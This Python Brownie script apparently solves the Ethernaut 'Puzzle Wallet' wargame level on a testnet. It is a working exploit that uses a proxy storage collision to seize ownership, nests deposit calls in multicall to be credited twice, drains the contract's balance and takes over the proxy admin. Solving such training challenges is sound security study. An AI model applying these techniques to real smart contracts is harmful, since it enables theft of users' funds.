from ctypes import addressof
from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3

import time
import json
import os

# for local deployment: 


# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# DEV deployment
# deployer=accounts[0]
# deployer=accounts[0]
# attacker=accounts[1]
# target_ct=Denial.deploy({'from': deployer, 'priority_fee': priority_fee})

acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x0CDc81c0505dC469cfA6931Bf6bb295804abc7F8'
puzzleWallet=interface.PuzzleWallet(target_address)
puzzleProxy=interface.PuzzleProxy(target_address)

# deploy attacker contract
# attacker_contract=dexTwoAttack.deploy(amount_swap, {'from': attacker, 'priority_fee': priority_fee})
# attacker.transfer(target_ct.address, 100000000000, priority_fee=priority_fee)

def main():

    print('--- values addresses ---')
    print('puzzleWallet:', puzzleWallet.address)
    print('puzzleProxy:', puzzleProxy.address)
    print('attacker:', attacker)

    print('--- values BEFORE attack ---')
    print('puzzleWallet.owner()', puzzleWallet.owner())
    print('puzzleProxy.admin()', puzzleProxy.admin())
    print('puzzleProxy.pendingAdmin()', puzzleProxy.pendingAdmin())
    balance_wallet=puzzleWallet.balance()
    print('balance_wallet', balance_wallet)

    # set the pendingAdmin() from Proxy >> this will update the owner of Wallet
    tx_pendingadmin=puzzleProxy.proposeNewAdmin(attacker, {'from': attacker, 'priority_fee': priority_fee})

    print(f'--- values after tx_pendingadmin ---')
    print('puzzleWallet.owner()', puzzleWallet.owner())
    print('puzzleProxy.admin()', puzzleProxy.admin())
    print('puzzleProxy.pendingAdmin()', puzzleProxy.pendingAdmin())
    print('puzzleWallet.whitelisted(attacker): ', puzzleWallet.whitelisted(attacker))

    # since we are now owner, we can add the attacker address to the whitelist
    tx_setwhitelist=puzzleWallet.addToWhitelist(attacker, {'from': attacker, 'priority_fee': priority_fee})

    print(f'--- values after tx_setwhitelist ---')
    print('puzzleWallet.whitelisted(attacker): ', puzzleWallet.whitelisted(attacker))

    # we can now empty the balance of the Wallet contract, in order to be able to set the maxbalance afterwards

    print(f'--- balances before tx_deposit ---')
    balance_wallet=puzzleWallet.balance()
    print('balance_wallet', balance_wallet)
    print('balance_attacker', puzzleWallet.balances(attacker))
    max_bal_int=puzzleWallet.maxBalance()
    max_bal_hex=hex(max_bal_int)
    print('max_bal_hex: ', max_bal_hex)

    tx_deposit=puzzleWallet.deposit({'from': attacker, 'priority_fee': priority_fee, 'amount': balance_wallet})

    # we do a nested tx, multicall inside a multicall in order to bypass the max 1 deposit control and credit the attacker balance twice the amount deposited
    data1=puzzleWallet.deposit.encode_input()
    calldata2=[data1]
    data2=puzzleWallet.multicall.encode_input(calldata2)
    print('data1: ', data1)
    print('data2: ', data2)

    calldata=[data1,data2]

    tx_nested_multi=puzzleWallet.multicall(calldata, {'from': attacker, 'priority_fee': priority_fee, 'amount': balance_wallet})

    print(f'--- balances after tx_nested_multi ---')
    print('balance_wallet', puzzleWallet.balance())
    print('balance_attacker', puzzleWallet.balances(attacker))
    print('max_bal_hex: ', max_bal_hex)

    # now we empty the Wallet (we put whatever dada in data required argument)
    tx_execute=puzzleWallet.execute(attacker, puzzleWallet.balance(), '0x', {'from': attacker, 'priority_fee': priority_fee})

    print(f'--- balances after tx_execute ---')
    balance_wallet=puzzleWallet.balance()
    print('balance_wallet', puzzleWallet.balance())
    print('balance_attacker', puzzleWallet.balances(attacker))
    print('max_bal_hex: ', max_bal_hex)

    # once the Wallet balance is 0, we can execute the setMaxBalance() function and put the attacker address
    tx_setMax=puzzleWallet.setMaxBalance(attacker.address, {'from': attacker, 'priority_fee': priority_fee})

    print(f'--- values after tx_setMax ---')
    print('puzzleWallet.owner()', puzzleWallet.owner())
    print('puzzleProxy.admin()', puzzleProxy.admin())
    print('puzzleProxy.pendingAdmin()', puzzleProxy.pendingAdmin())
    print('puzzleWallet.whitelisted(attacker): ', puzzleWallet.whitelisted(attacker))

    print('--- It is over ---')
    
